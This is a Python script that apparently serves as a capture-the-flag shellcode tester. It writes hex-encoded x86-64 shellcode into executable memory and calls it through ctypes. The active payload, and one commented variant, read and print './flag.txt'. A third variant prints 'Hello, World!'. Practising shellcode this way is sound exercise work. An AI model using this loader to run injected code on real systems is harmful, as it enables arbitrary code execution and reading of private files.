import ctypes
import mmap


def run():
    shellcode = bytes.fromhex("eb4e5f4831f6b8020000000f054989c0b809000000bf00000000be00100000ba0100000041ba0200000041b9000000000f054889c6bf01000000ba00040000b8010000000f054831c0b83c0000000f05e8adffffff2e2f666c61672e747874")
    print(shellcode)
    #shellcode = bytes.fromhex("eb3c5f4831f6b8020000000f054881ecff0f0000488d34244889c7baff0f00004831c00f05bf010000004889c2b8010000000f054831c0b83c0000000f05e8bfffffff2e2f666c61672e747874")
    #shellcode = b"\xeb\x13\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0f\x00\x00\x00\x0f\x05\xc3\xe8\xe8\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a"

    mm = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
    mm.write(shellcode)
    restype = ctypes.c_int64
    argtypes = tuple()
    ctypes_buffer = ctypes.c_int.from_buffer(mm)
    function = ctypes.CFUNCTYPE(restype, *argtypes)(ctypes.addressof(ctypes_buffer))
    function()


if __name__ == "__main__":
    run()
